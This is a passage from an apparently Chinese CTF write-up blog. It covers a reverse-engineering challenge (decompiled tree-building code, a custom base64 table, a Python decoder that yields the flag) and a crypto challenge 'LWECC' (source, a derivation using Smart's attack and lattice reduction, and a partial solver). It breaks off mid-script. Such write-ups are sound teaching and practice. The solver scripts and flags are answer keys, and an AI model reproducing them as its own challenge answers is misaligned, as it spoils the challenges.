v2;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;TreeNode *&gt;::push_back(v13, v12);</span><br><span class="line">    __gnu_cxx::__normal_iterator&lt;<span class="type">char</span> <span class="type">const</span>*,<span class="built_in">std</span>::<span class="built_in">string</span>&gt;::operator++(&amp;v10);</span><br><span class="line">  &#125;</span><br><span class="line">  i_2 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;TreeNode *&gt;::size(v13);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; i_2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    i_1 = <span class="number">2</span> * (i + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="number">2</span> * i + <span class="number">1</span> &lt; i_2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = *(_QWORD *)<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;TreeNode *&gt;::operator[](v13, <span class="number">2</span> * i + <span class="number">1</span>);</span><br><span class="line">      *(_QWORD *)(*(_QWORD *)<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;TreeNode *&gt;::operator[](v13, i) + <span class="number">8LL</span>) = v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( i_1 &lt; i_2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = *(_QWORD *)<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;TreeNode *&gt;::operator[](v13, i_1);</span><br><span class="line">      *(_QWORD *)(*(_QWORD *)<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;TreeNode *&gt;::operator[](v13, i) + <span class="number">16LL</span>) = v4;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v1 = *(_QWORD *)<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;TreeNode *&gt;::operator[](v13, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;TreeNode *&gt;::~<span class="built_in">vector</span>(v13);</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>main函数中的ans1和ans2写在.bss段，交叉引用可找到初始化函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall __static_initialization_and_destruction_0(<span class="type">int</span> a1, <span class="type">int</span> n0xFFFF)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// [rsp+17h] [rbp-19h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">1</span> &amp;&amp; n0xFFFF == <span class="number">0xFFFF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">std</span>::ios_base::Init::Init((<span class="built_in">std</span>::ios_base::Init *)&amp;<span class="built_in">std</span>::__ioinit);</span><br><span class="line">    __cxa_atexit((<span class="type">void</span> (*)(<span class="type">void</span> *))&amp;<span class="built_in">std</span>::ios_base::Init::~Init, &amp;<span class="built_in">std</span>::__ioinit, &amp;_dso_handle);</span><br><span class="line">    <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::allocator(&amp;v3);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::basic_string&lt;<span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;&gt;(</span><br><span class="line">      &amp;CUSTOM_BASE64_TABLE,</span><br><span class="line">      <span class="string">&quot;ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/&quot;</span>,</span><br><span class="line">      &amp;v3);</span><br><span class="line">    <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::~allocator(&amp;v3);</span><br><span class="line">    __cxa_atexit((<span class="type">void</span> (*)(<span class="type">void</span> *))&amp;<span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>, &amp;CUSTOM_BASE64_TABLE, &amp;_dso_handle);</span><br><span class="line">    <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::allocator(&amp;v3);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::basic_string&lt;<span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;&gt;(&amp;tmp1[abi:cxx11], &amp;unk_60E1, &amp;v3);</span><br><span class="line">    <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::~allocator(&amp;v3);</span><br><span class="line">    __cxa_atexit((<span class="type">void</span> (*)(<span class="type">void</span> *))&amp;<span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>, &amp;tmp1[abi:cxx11], &amp;_dso_handle);</span><br><span class="line">    <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::allocator(&amp;v3);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::basic_string&lt;<span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;&gt;(&amp;tmp2[abi:cxx11], &amp;unk_60E1, &amp;v3);</span><br><span class="line">    <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::~allocator(&amp;v3);</span><br><span class="line">    __cxa_atexit((<span class="type">void</span> (*)(<span class="type">void</span> *))&amp;<span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>, &amp;tmp2[abi:cxx11], &amp;_dso_handle);</span><br><span class="line">    <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::allocator(&amp;v3);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::basic_string&lt;<span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;&gt;(&amp;ans1[abi:cxx11], <span class="string">&quot;PTevaTqjNg5pa2GOxBSbcRJ0KiWgR2YY&quot;</span>, &amp;v3);</span><br><span class="line">    <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::~allocator(&amp;v3);</span><br><span class="line">    __cxa_atexit((<span class="type">void</span> (*)(<span class="type">void</span> *))&amp;<span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>, &amp;ans1[abi:cxx11], &amp;_dso_handle);</span><br><span class="line">    <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::allocator(&amp;v3);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::basic_string&lt;<span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;&gt;(&amp;ans2[abi:cxx11], <span class="string">&quot;WEmmcQCKV2abyU94RRmvOih5L2uJy1uL&quot;</span>, &amp;v3);</span><br><span class="line">    <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::~allocator(&amp;v3);</span><br><span class="line">    __cxa_atexit((<span class="type">void</span> (*)(<span class="type">void</span> *))&amp;<span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>, &amp;ans2[abi:cxx11], &amp;_dso_handle);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从而找到自定义base64字符集和ans1=’’PTevaTqjNg5pa2GOxBSbcRJ0KiWgR2YY’’，ans2=”WEmmcQCKV2abyU94RRmvOih5L2uJy1uL”</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自定义base64编码表</span></span><br><span class="line">custom_b64_table = <span class="string">&quot;ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/&quot;</span></span><br><span class="line">standard_b64_table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建转换表</span></span><br><span class="line">decode_trans = <span class="built_in">str</span>.maketrans(custom_b64_table, standard_b64_table)</span><br><span class="line">encode_trans = <span class="built_in">str</span>.maketrans(standard_b64_table, custom_b64_table)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_b64_decode</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="comment"># 去除可能的换行符</span></span><br><span class="line">    s = s.strip()</span><br><span class="line">    <span class="comment"># 将自定义base64转换回标准base64</span></span><br><span class="line">    s = s.translate(decode_trans)</span><br><span class="line">    <span class="comment"># 添加padding</span></span><br><span class="line">    s += <span class="string">&#x27;=&#x27;</span> * ((<span class="number">4</span> - <span class="built_in">len</span>(s) % <span class="number">4</span>) % <span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> base64.b64decode(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_ans</span>(<span class="params">ans_str, xor_key</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;解密ans字符串&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 1. base64解码</span></span><br><span class="line">    decoded_bytes = custom_b64_decode(ans_str)</span><br><span class="line">    <span class="comment"># 2. 异或解密</span></span><br><span class="line">    decrypted = <span class="built_in">bytes</span>([b ^ xor_key <span class="keyword">for</span> b <span class="keyword">in</span> decoded_bytes])</span><br><span class="line">    <span class="keyword">return</span> decrypted.decode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_tree_from_pre_in</span>(<span class="params">preorder, inorder</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;根据前序和中序遍历重建二叉树&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> preorder <span class="keyword">or</span> <span class="keyword">not</span> inorder:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    root_val = preorder[<span class="number">0</span>]</span><br><span class="line">    root = &#123;<span class="string">&#x27;val&#x27;</span>: root_val, <span class="string">&#x27;left&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;right&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 在中序中找到根的位置</span></span><br><span class="line">    root_index = inorder.index(root_val)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 递归构建左右子树</span></span><br><span class="line">    root[<span class="string">&#x27;left&#x27;</span>] = build_tree_from_pre_in(</span><br><span class="line">        preorder[<span class="number">1</span>:<span class="number">1</span>+root_index], </span><br><span class="line">        inorder[:root_index]</span><br><span class="line">    )</span><br><span class="line">    root[<span class="string">&#x27;right&#x27;</span>] = build_tree_from_pre_in(</span><br><span class="line">        preorder[<span class="number">1</span>+root_index:], </span><br><span class="line">        inorder[root_index+<span class="number">1</span>:]</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> root</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">level_order_traversal</span>(<span class="params">root</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;层次遍历（完全二叉树的顺序）&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    </span><br><span class="line">    result = []</span><br><span class="line">    queue = [root]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> queue:</span><br><span class="line">        node = queue.pop(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> node:</span><br><span class="line">            result.append(node[<span class="string">&#x27;val&#x27;</span>])</span><br><span class="line">            <span class="comment"># 对于完全二叉树，即使子节点为空也要保留位置</span></span><br><span class="line">            queue.append(node.get(<span class="string">&#x27;left&#x27;</span>))</span><br><span class="line">            queue.append(node.get(<span class="string">&#x27;right&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result.append(<span class="literal">None</span>)  <span class="comment"># 空节点</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 去除末尾的None（完全二叉树可能有不完整的最后一层）</span></span><br><span class="line">    <span class="keyword">while</span> result <span class="keyword">and</span> result[-<span class="number">1</span>] <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        result.pop()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">ans1_str = <span class="string">&quot;PTevaTqjNg5pa2GOxBSbcRJ0KiWgR2YY&quot;</span>  <span class="comment"># ans1（前序，异或7）</span></span><br><span class="line">ans2_str = <span class="string">&quot;WEmmcQCKV2abyU94RRmvOih5L2uJy1uL&quot;</span>  <span class="comment"># ans2（中序，异或8）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">preorder = decrypt_ans(ans1_str, <span class="number">7</span>)</span><br><span class="line">inorder = decrypt_ans(ans2_str, <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;前序遍历序列 (<span class="subst">&#123;<span class="built_in">len</span>(preorder)&#125;</span> chars): <span class="subst">&#123;preorder&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;中序遍历序列 (<span class="subst">&#123;<span class="built_in">len</span>(inorder)&#125;</span> chars): <span class="subst">&#123;inorder&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查长度是否一致</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(preorder) != <span class="built_in">len</span>(inorder):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;错误：前序(<span class="subst">&#123;<span class="built_in">len</span>(preorder)&#125;</span>)和中序(<span class="subst">&#123;<span class="built_in">len</span>(inorder)&#125;</span>)长度不一致！&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;序列长度: <span class="subst">&#123;<span class="built_in">len</span>(preorder)&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 重建二叉树</span></span><br><span class="line">    tree = build_tree_from_pre_in(preorder, inorder)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 层次遍历得到原始输入</span></span><br><span class="line">    level_order = level_order_traversal(tree)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 去除None，得到flag字符</span></span><br><span class="line">    flag_chars = [c <span class="keyword">for</span> c <span class="keyword">in</span> level_order <span class="keyword">if</span> c <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>]</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span>.join(flag_chars)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Flag: flag&#123;&#123;<span class="subst">&#123;flag&#125;</span>&#125;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="images/image-20251231171746553.png" alt=""></p>
<p><img src="images/image-20251231171846993.png" alt=""></p>
<p>得到<strong>flag{NoDup3TrEeB1dgFla9kVwYzQ}</strong></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a><strong>Crypto</strong></h2><ul>
<li>LWECC</li>
</ul>
<blockquote>
<p>Easy ECC…and LWE maybe</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = <span class="number">1096126227998177188652856107362412783873814431647</span></span><br><span class="line">E = EllipticCurve(GF(p), [<span class="number">0</span>, <span class="number">5</span>])</span><br><span class="line"></span><br><span class="line">s = [E.random_element() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">73</span>)]</span><br><span class="line">e = [E.random_element() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;01&quot;</span>]</span><br><span class="line">A = random_matrix(GF(p), <span class="number">137</span>, <span class="number">73</span>)</span><br><span class="line">b = [(<span class="built_in">sum</span>(i*j <span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(_,s)) + choice(e)).xy() <span class="keyword">for</span> _ <span class="keyword">in</span> A]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;A =&quot;</span>, A.<span class="built_in">list</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;b =&quot;</span>, b)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;enc =&quot;</span>, AES.new(key=md5(<span class="built_in">str</span>(s).encode()).digest(), nonce=<span class="string">b&quot;LWECC&quot;</span>, mode=AES.MODE_CTR).encrypt(flag))</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">
p=1096126227998177188652856107362412783873814431647 \\
y^2=x^3+5 \\
E(F_p)=\{ (x,y)|y^2=x^3+5\} \\
s=(s_1,s_2,...,s_{73})\in[E(F_p)]^{73} \\
e=(E_1,E_2)\in[E(F_p)]^2 \\
A\in F_p^{137*73} \\
A_{ij}\leftarrow$F_p \\
b_i={\sum_{j=1}^{73}{A_{ij}*s_j+\epsilon_i}}_{xy} \\
\epsilon=\leftarrow${E_1,E_2} \\
b=(b_1,b_2,...,b_{73}) \\
key=MD5(str(s))\in\{0,1\}^{128} \\
enc=AES-CTR_{key}(nonce="LWECC",plaintext=flag)</script><p><img src="/images/QianJianTec1767188383372.png" alt=""></p>
<p>目标：恢复私钥s，计算出key从而解密flag</p>
<p><img src="/images/QianJianTec1767188428720.png" alt=""></p>
<script type="math/tex; mode=display">
G\in E(F_p) \\
b_i\rightarrow P_i,v_i=log_GP_i(ECDLP) \\
v_i=\frac{x_{pQ_i}/y_{pQ_i}}{x_{pG}/y_{pG}}\ (mod\ p)\\
v=(v_1,v_2,...,v_{137})\in F_p^{137} \\
s_j'=log_Gs_j\in F_p,e_0'=log_GE_0,\delta=log_G(E_1-E_0)(ECDLP) \\
define:c_i=
\begin{cases}
1&\text {if }\epsilon_i=E_0 \\
0&\text {if }\epsilon_i=E_1 \\
\end{cases}
\\
then\ v_i={\sum_{j=1}^{73}{A_{ij}*s_j'+e_0'+c_i\delta}}\ (mod\ p) \\
(martrix)v=As'+e_0'*1+\delta*c \\
(1=(1,1,...,1)^T,c=(c_1,c_2,...,c_{137})^T) \\
(matrix)M=[A|1|c]\in F_p^{137*75} \\
M*(s',e_0',\delta)^T=v \\
K\in F_p^{k*137}(k≈137-75=62) \\
\because KM=0 \\
\therefore Kv=0 \\
\therefore \\
\forall r!=s \\
(K_rv)*(K_s)_j-(K_sv)*(K_r)_j\equiv0\ (mod\ p) \\
{\sum_{i=1}^{73}{R_{ji}c_i}\equiv0\ (mod\ p)},j=1,2,...,k-1 \\
(R_{ji}\in F_p) \\</script><script type="math/tex; mode=display">
(matrix)L\in Z^{k-1+137} \\
L=(\begin{matrix}
pI_{k-1}&0 \\
R^T&I_{137} \\
\end{matrix})
\\
LLL \\
to\ find\ x=(\alpha_1,\alpha_2,...,\alpha_{k-1},c_1,c_2,...,c_{k-1}) \\
(\alpha_1,\alpha_2,...,\alpha_{k-1}≈0,c_i\in \{0,1\}) \\
then\ we\ solve\ (A,1,c)*(s',e_0',\delta)^T=v \\
get\ s'\in F_p^{73} \\
s_j=s_j'*G\in E(F_p),j=1,2,...,73 \\
k=MD5(str([s_1,...,s_{73}]))\in \{0,1\}^{128} \\
flag=AES-CTR_k(nonce="LWECC",ciphertext=enc)^{-1} \\</script><p><img src="/images/QianJianTec1767188508573.png" alt=""></p>
<p>$I$是单位矩阵。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 数据读取</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取 A, b 和 enc</span></span><br><span class="line">A_list = ast.literal_eval(re.search(<span class="string">r&#x27;A\s*=\s*(\[.*?\])&#x27;</span>, data, re.S).group(<span class="number">1</span>))</span><br><span class="line">b_pts = ast.literal_eval(re.search(<span class="string">r&#x27;b\s*=\s*(\[.*?\])&#x27;</span>, data, re.S).group(<span class="number">1</span>))</span><br><span class="line">enc_match = re.search(<span class="string">r&#x27;enc\s*=\s*b([\&#x27;&quot;])(.*?)\1&#x27;</span>, data)</span><br><span class="line"><span class="keyword">if</span> enc_match:</span><br><span class="line">    <span class="comment"># 处理 b&quot;\x...&quot; 这种转义字符串</span></span><br><span class="line">    enc = enc_match.group(<span class="number">2</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>).decode(<span class="string">&#x27;unicode_escape&#x27;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># 尝试直接解析</span></span><br><span class="line">    enc = ast.literal_eval(re.search(<span class="string">r&#x27;enc\s*=\s*(b[\&#x27;&quot;].*?[\&#x27;&quot;])&#x27;</span>, data).group(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">p = <span class="number">1096126227998177188652856107362412783873814431647</span></span><br><span class="line">E = EllipticCurve(GF(p), [<span class="number">0</span>, <span class="number">5</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. Smart&#x27;s Attack (解决离散对数)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">smart_attack</span>(<span class="params">P, Q, p</span>):</span><br><span class="line">    E = P.curve()</span><br><span class="line">    Eqp = EllipticCurve(Qp(p, <span class="number">2</span>), [ZZ(t) + randint(<span class="number">0</span>, p)*p <span class="keyword">for</span> t <span class="keyword">in</span> E.a_invariants()])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">lift</span>(<span class="params">P</span>):</span><br><span class="line">        x, y = <span class="built_in">map</span>(ZZ, P.xy())</span><br><span class="line">        <span class="keyword">for</span> point <span class="keyword">in</span> Eqp.lift_x(x, <span class="built_in">all</span>=<span class="literal">True</span>):</span><br><span class="line">            <span class="keyword">if</span> GF(p)(point.xy()[<span class="number">1</span>]) == y: <span class="keyword">return</span> point</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Lift failed&quot;</span>)</span><br><span class="line">    P_qp = lift(P)</span><br><span class="line">    Q_qp = lift(Q)</span><br><span class="line">    pP = p * P_qp</span><br><span class="line">    pQ = p * Q_qp</span><br><span class="line">    xP, yP = pP.xy()</span><br><span class="line">    xQ, yQ = pQ.xy()</span><br><span class="line">    <span class="keyword">return</span> ZZ((xQ/yQ) / (xP/yP)) % p</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 映射到线性空间</span></span><br><span class="line">G = <span class="literal">None</span></span><br><span class="line"><span class="keyword">for</span> x_cand <span class="keyword">in</span> <span class="built_in">range</span>(<span 